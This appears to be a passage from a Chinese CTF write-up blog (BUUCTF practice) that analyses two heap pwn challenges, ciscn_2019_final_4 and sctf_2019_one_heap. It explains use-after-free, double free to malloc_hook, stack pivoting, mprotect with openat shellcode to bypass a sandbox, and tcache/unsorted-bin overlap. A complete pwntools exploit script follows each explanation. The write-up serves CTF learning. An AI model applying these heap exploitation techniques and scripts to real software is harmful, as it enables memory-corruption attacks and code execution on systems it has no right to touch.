<p>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用sigreturn系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条ret指令会使得执行流跳转到这段sigreturn代码，被动地进行sigreturn系统调用,把原来保存的寄存器信息弹回去，最后恢复进程的执行。</p>
<p>由此可以得出，因为程序是主动调用sigreturn的，并不需要<code>rt_sigreturn</code>指向一段代码，再调用sigreturn系统调用。</p>
<h2 id="ciscn-2019-final-4"><a href="#ciscn-2019-final-4" class="headerlink" title="ciscn_2019_final_4"></a><code>ciscn_2019_final_4</code></h2><p>这个题还是很好的题目，考察了很多的基础知识点。</p>
<h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><ul>
<li>开启了沙盒禁用execve</li>
<li>开头让你输入name，有一段可控的栈空间，且较大</li>
<li>pie保护没有开</li>
<li>存在反调试，使用ptrace做的，直接gdb attach过去会进入子程序，看不到堆情况(直接在fork 汇编处，改汇编，<code>jmp 到程序输出字符串的地方即可</code> )</li>
<li>watch函数中也用ptrace，监视了<code>open，mmap，fork，vfork，ptrace</code> </li>
</ul>
<pre><code class="c">while ( 1 )
  {
    ptrace(PTRACE_SYSCALL, a1, 0LL, 0LL);
    waitpid(a1, &amp;stat_loc, 0);
    if ( !(stat_loc &amp; 0x7F) || (char)((char)((stat_loc &amp; 0x7F) + 1) &gt;&gt; 1) &gt; 0 || (stat_loc &amp; 0xFF00) &gt;&gt; 8 != 5 )
      break;
    ptrace(PTRACE_GETREGS, a1, 0LL, &amp;v3);
    v2 = v4;
    if ( v4 == 2 || v2 == 9 || v2 == 0x39 || v2 == 0x3A || v2 == 0x65 )
    {
      puts(&quot;hey! what are you doing?&quot;);
      exit(-1);
    }
  }</code></pre>
<p>这里可以监视一下execve，好像就可以不用开沙箱了。</p>
<h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>存在uaf</p>
<h3 id="难点-1"><a href="#难点-1" class="headerlink" title="难点"></a>难点</h3><h4 id="orw的rop-chain往哪里读"><a href="#orw的rop-chain往哪里读" class="headerlink" title="orw的rop chain往哪里读"></a>orw的rop chain往哪里读</h4><p>程序自身是存在较少的gadgets的，想直接完成orw 的rop chain，是不可能的。<br>上来因为没开pie，能简单的完成一个read功能。在泄漏libc以后，就有更大的发挥空间了。</p>
<p>开头name有一大块可控地址，该怎么使用上。先输入一段垃圾数据，留着寻找。</p>
<pre><code class="python">sa(&#39;name&#39;,&#39;chumen77&#39;*10)</code></pre>
<p>在控制malloc hook后，随意写个地址，让其crash在这里，查看下栈地址：</p>
<pre><code class="python">data = 3 * &#39;\x00&#39; + p64(0xdeadbeef)
add(0x68,data)</code></pre>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/JsY1bN.png" srcset="/img/loading.gif" alt><br>发现断在0xdeadbeef，栈上可以看到输入的name情况。</p>
<p>此处来一个栈劫持，增加rsp 指针0x38 ，接着ret上去，就可以执行name上的东西，这个东西肯定写成仅能完成的read rop chain。</p>
<p>因为pie没开，可以使用这个新的read 在bss段上读取一个新的rop chain，接着ret 上去执行。新的rop chain，可以为mprotect解开bss段的执行权限，接着跳上orw flag的shellcode即可。（<strong>mprotect 需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。 这里直接设置为bss起始地址即可。</strong>）</p>
<h4 id="open被禁用了怎么办"><a href="#open被禁用了怎么办" class="headerlink" title="open被禁用了怎么办"></a>open被禁用了怎么办</h4><p>可以使用openat进行代替。</p>
<pre><code class="c">
#include &lt;fcntl.h&gt;

int open(const char *path, int oflag, mode_t mode);
int openat(int fd, const char *path, int oflag,  mode_t mode );
        //函数执行成功返回文件描述符，失败返回-1.</code></pre>
<p><a href="https://blog.csdn.net/liangzc1124/article/details/83475246" target="_blank" rel="noopener">https://blog.csdn.net/liangzc1124/article/details/83475246</a></p>
<p><a href="https://www.cnblogs.com/BinBinStory/p/7400993.html" target="_blank" rel="noopener">https://www.cnblogs.com/BinBinStory/p/7400993.html</a></p>
<p>其中重点就是，当openat的path参数，输入是绝对地址时，fd就会被无视，其函数就相当于open了。所以此处的fd，也是可以设成任意值。</p>
<h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
# encoding: utf-8
from pwn import *
import time
local_file  = &#39;./ciscn_final_4&#39;
elf = ELF(local_file)
context.log_level = &#39;debug&#39;
debug = 1
if debug:
    io = process(local_file)
    libc = elf.libc
else:
    io = remote(&#39;node3.buuoj.cn&#39;,25080)
    libc = elf.libc
    #libc = ELF(&#39;.&#39;)
context.arch = elf.arch
context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
#,&#39;&#39;splitw&#39;,&#39;-h&#39;
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
itr     = lambda                    :io.interactive()
def debug():
    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
    gdb.attach(io)
    pause()

def add(size,data):
    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)
    sla(&#39;size&#39;,str(size))    
    sa(&#39;tent&#39;,str(data))

def free(idx):
    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)
    sla(&#39;index&#39;,str(idx))

def show(idx):
    sla(&#39;&gt;&gt;&#39;,&#39;3&#39;)
    sla(&#39;index&#39;,str(idx))
bss = 0x6021C0
pop_rdi = 0x0000000000401193
pop_rsi_r15 = 0x0000000000401191
pop_rsp_r13_r14_r15 = 0x000000000040118d
orw = flat([pop_rdi,0,pop_rsi_r15,bss + 0x400,0,elf.plt[&#39;read&#39;],pop_rsp_r13_r14_r15,bss + 0x400,0,0,0])
sa(&#39;name&#39;,str(orw))
# sa(&#39;name&#39;,&#39;chumen77&#39;*10)
add(0x1000,&#39;1&#39;)
add(0x10,&#39;2&#39;)
free(0)
show(0)
r()
libcbase = uu64(r(6)) - 0x3c4b78
info_addr(&#39;libcbase&#39;,libcbase)
add(0x68,&#39;3&#39;)
add(0x68,&#39;4&#39;)
add(0x68,&#39;5&#39;)
free(2)
free(3)
free(2)
malloc_hook = 0x3c4afd + libcbase
add(0x68,p64(malloc_hook))
add(0x68,&#39;7&#39;)
add(0x68,&#39;8&#39;)
rsp_add_0x38 = libc.search(asm(&quot;add rsp , 0x38\nret&quot;)).next()
data = 3 * &#39;\x00&#39; + p64(rsp_add_0x38 + libcbase)
# data = 3 * &#39;\x00&#39; + p64(0xdeadbeef)
add(0x68,data)
# debug()
sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)
sla(&#39;size&#39;,&#39;20&#39;)
sleep(0.2)
pop_rdx = libcbase + libc.search(asm(&quot;pop rdx\nret&quot;)).next()
pop_rsp = libcbase + libc.search(asm(&quot;pop rsp\nret&quot;)).next()
mprotect = libcbase + libc.sym[&#39;mprotect&#39;]
payload = flat([pop_rdi,0x00602000,pop_rsi_r15,0x1000,0,pop_rdx,7,mprotect,0x602628])
shellcode = shellcraft.linux.openat(0,&#39;/flag&#39;,0) + shellcraft.linux.read(3,bss+0x200,0x30) + shellcraft.linux.write(1,bss+0x200,0x30)
sleep(0.2)
s(p64(0)*3 + payload + p64(0) + asm(shellcode))
# debug()
itr()</code></pre>
<h3 id="延伸做法"><a href="#延伸做法" class="headerlink" title="延伸做法"></a>延伸做法</h3><p><a href="https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/" target="_blank" rel="noopener">https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/</a></p>
<p>其是用<code>house_of_orange+setcontext+0x35</code>调用read传入ropchain来完成攻击。</p>
<p>如果无法控制<code>free_hook</code>且在libc-2.23情况下可以利用这个办法。</p>
<h2 id="sctf-2019-one-heap"><a href="#sctf-2019-one-heap" class="headerlink" title="sctf_2019_one_heap"></a><code>sctf_2019_one_heap</code></h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><ul>
<li>不可指定idx，来操作chunk，只能操作当前malloc 分配chunk对应的heap地址</li>
<li>只有free 和 add，free可以4次，add可以<code>0xf</code>次</li>
</ul>
<h3 id="难点-2"><a href="#难点-2" class="headerlink" title="难点"></a>难点</h3><ul>
<li>无show函数</li>
<li>有限的free次数，只能通过合适的堆技巧或者爆破来完成攻击</li>
</ul>
<p>此题由于只能4次free，其中3次free还是直接必须执行的，只剩下的一次就尤为关键。目标就是在其free以后，有办法让再次申请的chunk可以修改到这个free chunk对应tcache bin的fd，来进行tcache attack。</p>
<p>当一个堆A同时在tcache里面，又在unsortbin里面，这种情况是常见的，并且也是危险的。</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/T5GJ9H.png" srcset="/img/loading.gif" alt></p>
<p>当先申请一个小的chunk C，其肯定是在此chunk上按照unsortbin的规则，分割一下，留下一个小的unsortbin bin。<br><img src="http://qiqianyun.chumen77.xyz/uPic/yB8mNI.png" srcset="/img/loading.gif" alt></p>
<p>然后接着申请一个相同于chunk A大小的堆，就有机会改到这个2个被分割完的小chunk。<strong>比如改0x61的unsortbin的信息，可以改其size，并且提前在chunk B处伪造好数据，即可完成一个fake 的 unsortbin。</strong></p>
<p> <img src="http://qiqianyun.chumen77.xyz/uPic/pCToHT.png" srcset="/img/loading.gif" alt></p>
<p>倘若再申请一个合适的大小，比如0x68，即可改到chunk B的数据。此题也就是改其fd指针，即可接着完成tcache attack。</p>
<h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
# encoding: utf-8
from pwn import *
import time
local_file  = &#39;./sctf_2019_one_heap&#39;
elf = ELF(local_file)
context.log_level = &#39;debug&#39;
debug = 1
if debug:
    io = process(local_file)
    libc = elf.libc
else:
    io = remote(&#39;node3.buuoj.cn&#39;,27411)
    libc = elf.libc
    #libc = ELF(&#39;.&#39;)
context.arch = elf.arch
context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
#,&#39;&#39;splitw&#39;,&#39;-h&#39;
rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
rce18 = [0x4f2c5,0x4f322,0x10a38c]
roc = [0x2,0x4,0x6,0xB,0xC,0xD]
arae16 = 0x3c4b78
arae18 = 0x3ebca0
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
itr     = lambda                    :io.interactive()
def debug():
    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
    gdb.attach(io)
    pause()
def add(size,data):
    sla(&#39;ice&#39;,&#39;1&#39;)
    sla(&#39;size&#39;,str(size))
    sa(&#39;tent&#39;,str(data))

def free():
    sla(&#39;ice&#39;,&#39;2&#39;)

def leak_addr():
    add(0x7f,&#39;chumen77&#39; + &#39;\n&#39;)
    free()
    free()
    add(0x7f,&#39;\n&#39;)
    add(0x7f,&#39;\n&#39;)
    #夹在top chunk前面，防止进入unsortbin时直接合并。并且fake一些数据，留着绕过后面的检查。
    add(0x30,p64(0)*4+p64(0x90) + p64(0x20))
    free()
    add(0x7f,&#39;\n&#39;)
    free()
    add(0x28,p16(0x9750) + &#39;\n&#39;)
    debug()
    # 修改剩下0x60大小的unsortbin的大小为0x90，且前面已经有fake的数据，不会让程序crush
    add(0x7f,p64(0)*5 + p64(0x91) +&#39;\n&#39;)
    payload = p64(0)*2 + p64(0xfbad3c80) + p64(0) * 3 + &#39;\x00&#39;
    add(0x7f,payload + &#39;\n&#39;)


leak = 0
while True:
    try:
        leak_addr()
        ss = io.recvuntil(chr(0x7f),timeout = 0.5)
        if len(ss) == 0:
            raise Exception(&#39;&#39;)
        io.recv(16)
        leak = u64(io.recv(8))
        if leak == 0x320a6464412e310a:
            raise Exception(&#39;&#39;)
        break
    except Exception:
        io.close()
        io = process(&#39;./sctf_2019_one_heap&#39;)
        # io = remote(&#39;node3.buuoj.cn&#39;,28690)
        continue

leak = leak &gt;&gt; 16
info_addr(&#39;leak&#39;,leak)
libc_base = leak - 4110208
info_addr(&#39;libc_base&#39;,libc_base)
malloc_hook = 0x3ebc30 + libc_base
payload = p64(0) * 11 + p64(0x41) + p64(malloc_hook-8)
debug()
# 修改0x40 tcache bin的chain
add(0x68,payload)
debug()
add(0x38,&#39;\n&#39;)
realloc=libc_base+libc.symbols[&#39;realloc&#39;] + roc[1]
one = 0x10a38c + libc_base
payload = p64(one) + p64(realloc)
add(0x38,payload + &#39;\n&#39;)
add(0x20,&#39;\n&#39;)
# debug()
itr()</code></pre>

            <hr>
          </div>
          <br>
          <div>
            <p>
            
            
              <span>
                <i class="iconfont icon-tag"></i>
                
                  <a class="hover-with-bg" href="/tags/pwn">pwn</a>
                
              </span>
            
            </p>
            
              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
            
          </div>
        </div>
      </div>
    </div>
    <div class="d-none d-lg-block col-lg-2 toc-container">
      
  <div id="toc">
    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
    <div id="tocbot"></div>
  </div>

    </div>
  </div>
</div>

<!-- custom -->


<!-- Comments -->
<div class="col-lg-7 mx-auto nopadding-md">
  <div class="container comments mx-auto" id="comments">
    
  </div>
</div>

    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  <footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    <br>

    
  
    <!-- 不蒜子统计PV -->
    
    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
  
  
    <!-- 不蒜子统计UV -->
    
    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
  
  <br>



    


    <!-- cnzz Analytics icon -->
    

  </div>
</footer>

<!-- SCRIPTS -->
<script src="/lib/jquery/jquery.min.js" ></script>
<script src="/lib/popper/popper.min.js" ></script>
<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
<script src="/js/main.js" ></script>


  <script src="/js/lazyload.js" ></script>



  
    <script src="/lib/tocbot/tocbot.min.js" ></script>
  
  <script src="/js/post.js" ></script>



  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>



  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>


<!-- Plugins -->


  

  

  

  

  <!-- cnzz Analytics -->
  



  <script src="/lib/prettify/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="/lib/typed/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "BUUCTF 刷题记录&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="/lib/anchor/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "false",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>





  
  
    <script type="text/javascript">
      //定义获取词语下标
      var a_idx = 0;
      jQuery(document).ready(function ($) {
        //点击body时触发事件
        $("body").click(function (e) {
          //需要显示的词语
          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
          //设置词语给span标签
          var $i = $("<span/>").text(a[a_idx]);
          //下标等于原来下标+1  余 词语总数
          a_idx = (a_idx + 1) % a.length;
          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
          //获取x和y的指针坐标
          var x = e.pageX, y = e.pageY;
          //在鼠标的指针的位置给$i定义的span标签添加css样式
          $i.css({
            "z-index": 999,
            "top": y - 20,
            "left": x,
            "position": "absolute",
            "font-weight": "bold",
            "color": rand_color()
          });
          // 随机颜色
          function rand_color() {
            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
          }
          //在body添加这个标签
          $("body").append($i);
          //animate() 方法执行 CSS 属性集的自定义动画。
          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
          $i.animate({
            //将原来的位置向上移动180
            "top": y - 180,
            "opacity": 0
            //1500动画的速度
          }, 1500, function () {
            //时间到了自动删除
            $i.remove();
          });
        });
      })
      ;
    </script>
  








</body>
</html>
